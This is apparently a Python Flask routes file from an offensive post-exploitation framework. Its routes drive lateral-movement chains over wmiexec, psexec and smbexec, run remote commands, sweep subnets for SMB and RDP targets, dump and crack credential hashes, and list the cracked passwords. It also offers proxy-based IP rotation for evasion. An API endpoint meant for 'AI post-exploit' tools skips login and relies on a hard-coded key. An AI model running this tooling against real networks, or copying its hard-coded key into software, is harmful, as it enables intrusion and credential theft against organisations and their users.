"""
Lateral Movement Routes
Flask routes for lateral movement chain execution and management
"""
import json
from datetime import datetime
from flask import Blueprint, render_template, request, jsonify, redirect, session

from cybermodules.lateral_movement import LateralMovementEngine, LateralMethod
from cybermodules.hashdump import HashDumpEngine
from cybermodules.lateral_hooks import LateralSessionHook
from cyberapp.models.db import db_conn

lateral_bp = Blueprint("lateral", __name__)


# ==================== DASHBOARD ====================

@lateral_bp.route("/lateral")
def lateral_dashboard():
    """Lateral movement dashboard"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    # Get recent lateral movement attempts
    recent_movements = []
    chains = []
    
    try:
        with db_conn() as conn:
            # Recent movements
            rows = conn.execute(
                """SELECT id, scan_id, source_host, target_host, method, username, status, timestamp 
                FROM lateral_movement ORDER BY timestamp DESC LIMIT 20"""
            ).fetchall()
            
            for row in rows:
                recent_movements.append({
                    'id': row[0],
                    'scan_id': row[1],
                    'source': row[2],
                    'target': row[3],
                    'method': row[4],
                    'username': row[5],
                    'status': row[6],
                    'timestamp': row[7]
                })
            
            # Recent chains
            chain_rows = conn.execute(
                """SELECT id, scan_id, chain_depth, hosts_visited, pivot_path, created_at 
                FROM pivot_chains ORDER BY created_at DESC LIMIT 10"""
            ).fetchall()
            
            for row in chain_rows:
                chains.append({
                    'id': row[0],
                    'scan_id': row[1],
                    'depth': row[2],
                    'hosts': json.loads(row[3]) if row[3] else [],
                    'path': json.loads(row[4]) if row[4] else [],
                    'created_at': row[5]
                })
                
    except Exception as e:
        print(f"[!] Error loading lateral data: {e}")
    
    return render_template(
        "lateral.html",
        recent_movements=recent_movements,
        chains=chains
    )


# ==================== CHAIN EXECUTION ====================

@lateral_bp.route("/lateral/chain", methods=["POST"])
def start_chain():
    """
    Start a lateral movement chain
    
    Request JSON:
    {
        "initial_target": "192.168.1.10",
        "targets": ["192.168.1.20", "192.168.1.30"],
        "credentials": {
            "username": "admin",
            "password": "P@ssw0rd",
            "domain": "CORP",
            "nt_hash": "aad3b435b51404eeaad3b435b51404ee"
        },
        "methods": ["wmiexec", "psexec", "smbexec"],
        "options": {
            "dump_creds": true,
            "max_depth": 3,
            "timeout": 30
        }
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    initial_target = data.get("initial_target")
    targets = data.get("targets", [])
    credentials = data.get("credentials", {})
    methods = data.get("methods", ["wmiexec", "psexec", "smbexec"])
    options = data.get("options", {})
    
    # OPSEC option - routes traffic through proxy for IP rotation
    opsec_enabled = options.get("opsec", False)
    
    if not initial_target:
        return jsonify({
            "success": False,
            "error": "initial_target is required"
        }), 400
    
    # Create scan entry
    scan_id = _create_chain_scan(initial_target, targets)
    
    # Build session info
    session_info = {
        "target": initial_target,
        "username": credentials.get("username", ""),
        "password": credentials.get("password", ""),
        "domain": credentials.get("domain", ""),
        "nt_hash": credentials.get("nt_hash", ""),
        "lm_hash": credentials.get("lm_hash", ""),
        "lhost": data.get("lhost", ""),
        "lport": data.get("lport", 4444)
    }
    
    # Initialize engine with OPSEC support
    engine = LateralMovementEngine(scan_id, session_info, opsec_enabled=opsec_enabled)
    
    # Add targets
    all_targets = [initial_target] + targets
    engine.add_manual_targets(all_targets)
    
    # Convert method strings to enum
    method_enums = []
    for m in methods:
        try:
            method_enums.append(LateralMethod(m.lower()))
        except ValueError:
            pass
    
    if not method_enums:
        method_enums = [LateralMethod.WMIEXEC, LateralMethod.PSEXEC, LateralMethod.SMBEXEC]
    
    # Execute chain
    try:
        # If dump_creds is enabled, use hash thief pattern
        if options.get("dump_creds"):
            results = engine.execute_hash_thief_pattern(
                initial_target,
                [credentials]
            )
        else:
            # Simple chain execution
            pivot_sequence = []
            for target in all_targets:
                pivot_sequence.append({
                    'target': target,
                    'creds': credentials
                })
            results = engine.execute_pivot_chain(pivot_sequence)
        
        # Save to database
        _save_chain_results(scan_id, results, engine)
        
        return jsonify({
            "success": True,
            "scan_id": scan_id,
            "results": results,
            "summary": {
                "total_hosts": len(all_targets),
                "successful": engine.success_count,
                "failed": engine.fail_count
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "scan_id": scan_id
        }), 500


@lateral_bp.route("/lateral/quick-jump", methods=["POST"])
def quick_jump():
    """
    Quick single-target lateral movement
    
    Request JSON:
    {
        "target": "192.168.1.50",
        "username": "admin",
        "password": "P@ssw0rd",
        "domain": "CORP",
        "method": "wmiexec",
        "command": "whoami",
        "opsec": true
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    target = data.get("target")
    username = data.get("username")
    password = data.get("password")
    domain = data.get("domain", "")
    nt_hash = data.get("nt_hash", "")
    method = data.get("method", "wmiexec")
    command = data.get("command")
    opsec_enabled = data.get("opsec", False)
    
    if not target or not username:
        return jsonify({
            "success": False,
            "error": "target and username are required"
        }), 400
    
    # Create quick scan
    scan_id = _create_chain_scan(target, [])
    
    session_info = {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain,
        "nt_hash": nt_hash
    }
    
    # Initialize engine with OPSEC support
    engine = LateralMovementEngine(scan_id, session_info, opsec_enabled=opsec_enabled)
    
    credentials = {
        'username': f"{domain}\\{username}" if domain else username,
        'password': password,
        'nt_hash': nt_hash,
        'lm_hash': '',
        'source': 'manual'
    }
    
    try:
        method_enum = LateralMethod(method.lower())
    except ValueError:
        method_enum = LateralMethod.WMIEXEC
    
    result = engine.attempt_lateral_movement(
        {'hostname': target, 'ip': target},
        credentials,
        methods=[method_enum]
    )
    
    # Log to database
    _log_movement(scan_id, "local", target, method, username, 
                  "success" if result['success'] else "failed")
    
    return jsonify({
        "success": result['success'],
        "scan_id": scan_id,
        "target": target,
        "method": method,
        "output": result.get('methods', [{}])[0].get('output', ''),
        "error": result.get('methods', [{}])[0].get('error', '') if not result['success'] else None
    })


# ==================== DISCOVERY ====================

@lateral_bp.route("/lateral/discover", methods=["POST"])
def discover_targets():
    """
    Discover targets in a network
    
    Request JSON:
    {
        "subnet": "192.168.1.0/24",
        "ports": [445, 139, 3389],
        "scan_id": 1
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    subnet = data.get("subnet")
    ports = data.get("ports", [445, 139])
    scan_id = data.get("scan_id", 0)
    
    if not subnet:
        return jsonify({
            "success": False,
            "error": "subnet is required"
        }), 400
    
    engine = LateralMovementEngine(scan_id)
    engine.discover_network_targets(subnet, ports)
    
    return jsonify({
        "success": True,
        "targets": engine.targets,
        "count": len(engine.targets)
    })


@lateral_bp.route("/lateral/ad-targets", methods=["GET"])
def get_ad_targets():
    """Get targets from AD enumeration results"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    scan_id = request.args.get("scan_id", 0, type=int)
    
    engine = LateralMovementEngine(scan_id)
    targets = engine.get_targets_from_ad_enum()
    
    return jsonify({
        "success": True,
        "targets": targets,
        "count": len(targets)
    })


# ==================== CREDENTIAL MANAGEMENT ====================

@lateral_bp.route("/lateral/creds", methods=["GET"])
def get_credentials():
    """Get available credentials for lateral movement"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    scan_id = request.args.get("scan_id", 0, type=int)
    
    credentials = []
    
    try:
        with db_conn() as conn:
            # Get from cracked_credentials
            rows = conn.execute(
                """SELECT username, password, hash_source, cracked_at 
                FROM cracked_credentials 
                WHERE scan_id = ? OR ? = 0
                ORDER BY cracked_at DESC""",
                (scan_id, scan_id)
            ).fetchall()
            
            for row in rows:
                credentials.append({
                    'username': row[0],
                    'password': row[1],
                    'source': row[2],
                    'cracked_at': row[3]
                })
                
    except Exception as e:
        pass
    
    return jsonify({
        "success": True,
        "credentials": credentials,
        "count": len(credentials)
    })


@lateral_bp.route("/lateral/dump", methods=["POST"])
def dump_credentials():
    """
    Dump credentials from a target
    
    Request JSON:
    {
        "target": "192.168.1.10",
        "username": "admin",
        "password": "P@ssw0rd",
        "domain": "CORP",
        "method": "secretsdump"
    }
    """
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    target = data.get("target")
    username = data.get("username")
    password = data.get("password")
    domain = data.get("domain", "")
    nt_hash = data.get("nt_hash", "")
    
    if not target or not username:
        return jsonify({
            "success": False,
            "error": "target and username are required"
        }), 400
    
    scan_id = _create_chain_scan(target, [])
    
    session_info = {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain,
        "nt_hash": nt_hash
    }
    
    try:
        hashdump = HashDumpEngine(scan_id, session_info)
        result = hashdump.execute_session_hook()
        
        return jsonify({
            "success": result.get('success', False),
            "scan_id": scan_id,
            "hashes": result.get('extraction', {}).get('hashes', []),
            "cracked": result.get('cracked', []),
            "total_cracked": result.get('total_cracked', 0)
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


# ==================== CHAIN STATUS ====================

@lateral_bp.route("/lateral/status/<int:scan_id>")
def chain_status(scan_id):
    """Get status of a lateral movement chain"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    movements = []
    chain_info = None
    
    try:
        with db_conn() as conn:
            # Get movements
            rows = conn.execute(
                """SELECT source_host, target_host, method, username, status, timestamp 
                FROM lateral_movement WHERE scan_id = ? ORDER BY timestamp""",
                (scan_id,)
            ).fetchall()
            
            for row in rows:
                movements.append({
                    'source': row[0],
                    'target': row[1],
                    'method': row[2],
                    'username': row[3],
                    'status': row[4],
                    'timestamp': row[5]
                })
            
            # Get chain info
            chain_row = conn.execute(
                """SELECT chain_depth, hosts_visited, pivot_path, created_at 
                FROM pivot_chains WHERE scan_id = ? ORDER BY created_at DESC LIMIT 1""",
                (scan_id,)
            ).fetchone()
            
            if chain_row:
                chain_info = {
                    'depth': chain_row[0],
                    'hosts': json.loads(chain_row[1]) if chain_row[1] else [],
                    'path': json.loads(chain_row[2]) if chain_row[2] else [],
                    'created_at': chain_row[3]
                }
                
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
    return jsonify({
        "success": True,
        "scan_id": scan_id,
        "movements": movements,
        "chain": chain_info,
        "total_movements": len(movements),
        "successful": len([m for m in movements if m['status'] == 'success'])
    })


# ==================== HELPER FUNCTIONS ====================

def _create_chain_scan(initial_target, targets):
    """Create a new scan entry for chain tracking"""
    try:
        with db_conn() as conn:
            cursor = conn.execute(
                """INSERT INTO scans (name, target, status, created_at) 
                VALUES (?, ?, 'running', datetime('now'))""",
                (f"Lateral Chain: {initial_target}", initial_target)
            )
            conn.commit()
            return cursor.lastrowid
    except Exception as e:
        print(f"[!] Error creating scan: {e}")
        return 0


def _log_movement(scan_id, source, target, method, username, status):
    """Log a lateral movement attempt"""
    try:
        with db_conn() as conn:
            conn.execute(
                """INSERT INTO lateral_movement 
                (scan_id, source_host, target_host, method, username, status, timestamp) 
                VALUES (?, ?, ?, ?, ?, ?, datetime('now'))""",
                (scan_id, source, target, method, username, status)
            )
            conn.commit()
    except Exception as e:
        print(f"[!] Error logging movement: {e}")


def _save_chain_results(scan_id, results, engine):
    """Save chain results to database"""
    try:
        with db_conn() as conn:
            # Save individual movements
            for result in engine.results:
                status = "success" if result.get('success') else "failed"
                method = result.get('session_info', {}).get('method', 'unknown')
                
                conn.execute(
                    """INSERT INTO lateral_movement 
                    (scan_id, source_host, target_host, method, username, status, timestamp) 
                    VALUES (?, ?, ?, ?, ?, ?, datetime('now'))""",
                    (scan_id, "chain", result.get('target', ''), method, 
                     result.get('username', ''), status)
                )
            
            # Save chain summary
            if isinstance(results, dict) and 'visited_hosts' in results:
                # Hash thief pattern result
                conn.execute(
                    """INSERT INTO pivot_chains 
                    (scan_id, chain_depth, hosts_visited, pivot_path, created_at) 
                    VALUES (?, ?, ?, ?, datetime('now'))""",
                    (scan_id, results.get('total_pivots', 0),
                     json.dumps(results.get('visited_hosts', [])),
                     json.dumps(results.get('pivot_path', [])))
                )
            elif isinstance(results, list):
                # Pivot chain result
                successful_steps = [r for r in results if r.get('success')]
                hosts = [r.get('target') for r in results]
                
                conn.execute(
                    """INSERT INTO pivot_chains 
                    (scan_id, chain_depth, hosts_visited, pivot_path, created_at) 
                    VALUES (?, ?, ?, ?, datetime('now'))""",
                    (scan_id, len(successful_steps), json.dumps(hosts), json.dumps(results))
                )
            
            conn.commit()
            
    except Exception as e:
        print(f"[!] Error saving chain results: {e}")


# ==================== API FOR EXTERNAL TOOLS ====================

@lateral_bp.route("/api/lateral/execute", methods=["POST"])
def api_execute_chain():
    """
    API endpoint for external tools (e.g., AI post-exploit)
    
    Request JSON:
    {
        "api_key": "...",
        "chain_config": {
            "initial_target": "192.168.1.10",
            "targets": [...],
            "credentials": {...},
            "options": {...}
        }
    }
    """
    data = request.get_json()
    
    # Basic API key check (should be improved)
    api_key = data.get("api_key")
    if api_key != "internal_chain_key":
        return jsonify({"error": "unauthorized"}), 401
    
    chain_config = data.get("chain_config", {})
    
    # Reuse the chain logic
    request._cached_json = (chain_config, chain_config)
    return start_chain()
